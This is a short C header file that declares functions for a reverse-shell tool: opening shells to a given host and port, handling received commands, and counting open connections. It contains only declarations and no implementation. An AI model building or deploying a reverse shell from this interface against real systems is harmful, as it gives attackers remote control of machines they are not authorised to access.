#pragma once

void reverse_shell(const char *host, unsigned int port, unsigned int num_shells);
void handle_cmd(int sock, char *input);
void reverse_shell_classic(int sock, char *shell, char *cmd);
int num_current_connections(const char *host, unsigned int port);
